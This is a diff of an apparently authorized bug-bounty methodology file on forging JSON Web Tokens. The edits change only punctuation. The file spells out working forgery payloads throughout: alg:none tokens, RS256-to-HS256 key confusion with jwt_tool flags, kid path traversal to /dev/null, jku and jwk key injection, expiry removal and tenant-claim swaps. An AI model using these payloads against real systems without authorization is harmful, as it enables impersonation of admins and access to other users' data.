@@ -29,26 +29,26 @@ sources: hackerone_public
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-JWT-CRYPTO: Forgeable JSON Web Tokens (A04 Cryptographic Failures)
+# HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)
 
 ## What actually pays
 
 A JWT is `header.payload.signature`, each base64url. The signature is the only
 thing stopping you from editing the payload (your identity/role) and replaying
 it. It pays **High/Critical** when the verifier can be tricked into accepting a
-token you forged; so you become another user or an admin without their secret.
+token you forged — so you become another user or an admin without their secret.
 
 Two classic, generic verifier flaws:
 
-- **`alg:none`**; the verifier trusts the token's own `alg` header. Set
+- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
   `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
   another user's `id`/`email`). A broken verifier skips signature checking.
-- **RS256 → HS256 key confusion**; the token is signed RS256 (asymmetric). The
+- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
   RSA **public** key is, by definition, public. If the verifier lets you choose
-  HS256, it will use that public key as the HMAC *secret*; which you also know.
+  HS256, it will use that public key as the HMAC *secret* — which you also know.
   Sign an edited payload with HS256 using the public key and it validates.
 
-## Recon: is this app JWT-based?
+## Recon — is this app JWT-based?
 
 ```
 Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
@@ -59,22 +59,22 @@ A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the
 Decode the header (base64url the first segment). `"alg":"RS256"` → try key
 confusion. Any alg → always try `alg:none` first; it's free.
 
-## Forging the token (never hand-encode base64: use a JWT tool)
+## Forging the token (never hand-encode base64 — use a JWT tool)
 
 Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
 (`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
 public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
 of **PyJWT**. Each forge below is the concept plus the claim to edit.
 
-**alg:none; become admin / another user**
+**alg:none — become admin / another user**
 ```
 header:    {"alg":"none","typ":"JWT"}
 payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
-signature: (empty; keep the trailing dot:  header.payload. )
+signature: (empty — keep the trailing dot:  header.payload. )
 ```
-Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE`; try case variants.
+Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.
 
-**RS256 → HS256 key confusion; once you have the RSA public key**
+**RS256 → HS256 key confusion — once you have the RSA public key**
 ```
 1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
    /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
@@ -84,17 +84,17 @@ Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE`; try case
    payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
 ```
 
-**kid header injection; verifier loads the HMAC key from a FILE named by `kid`**
+**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
 ```
 header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
 secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
 payload: {"sub":"administrator"}
 ```
 Traverse out of the keys directory first. `kid` can also carry SQLi / command
-injection / SSRF if the key lookup hits a DB / shell / URL; same idea: `kid` is
+injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
 attacker-controlled and reaches a dangerous sink.
 
-**jku / x5u header injection (RS256); verifier fetches the public key from a URL in the token**
+**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
 ```
 1. Host a JWKS containing a public key you control, on a server the verifier can reach.
 2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
@@ -103,7 +103,7 @@ attacker-controlled and reaches a dangerous sink.
    path on the target's OWN domain so the fetch resolves to your JWKS.
 ```
 
-**jwk header self-signed key injection (RS256); embed an attacker-controlled public key in the token**
+**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
 ```
 header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
 payload: {"sub":"administrator"}
@@ -113,14 +113,14 @@ Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and 
 
 **Expiry / time-based claim manipulation**
 ```
-Remove "exp" (expiration) claim entirely; many validators skip the check if absent.
+Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
 Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
 Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
 ```
 Combined with any forging technique above (alg:none, key confusion, jwk injection), this
 bypasses time-based validation when the verifier does not enforce strict expiry rules.
 
-**Cross-tenant claim injection; escalate to another tenant's data via claim swaps**
+**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
 ```
 Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
 "workspace_id", "customer_id". Edit the target claim to another tenant's value.
@@ -129,11 +129,11 @@ Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's 
 Changing claims invalidates a properly verified signature. This is an authorization test only after establishing how the modified token can be accepted or obtaining an authorized test issuer; trusting authenticated issuer-bound tenant claims is not itself IDOR.
 Works especially well combined with alg:none or weak-secret attacks.
 
-Match the `payload` shape to a REAL token from the app (decode one first); keep
+Match the `payload` shape to a REAL token from the app (decode one first) — keep
 its claim names, only change identity/role. A payload the app can't parse fails
 for the wrong reason and wastes the attempt.
 
-## Offline attacks: weak HMAC secret cracking
+## Offline attacks — weak HMAC secret cracking
 
 If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
 password list:
@@ -172,13 +172,13 @@ Record the intended role/resource boundary, a redacted original and modified cla
 
 - Decode and confirm the token you sent actually carries the edited claims.
 - The win is **cross-identity data access**, not merely a 200. Use a controlled canary identifier, not real foreign-user data, in the response evidence.
-- `alg:none` rejected (401) just means that flaw is patched; try key confusion
+- `alg:none` rejected (401) just means that flaw is patched — try key confusion
   before concluding the app is safe.
 
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
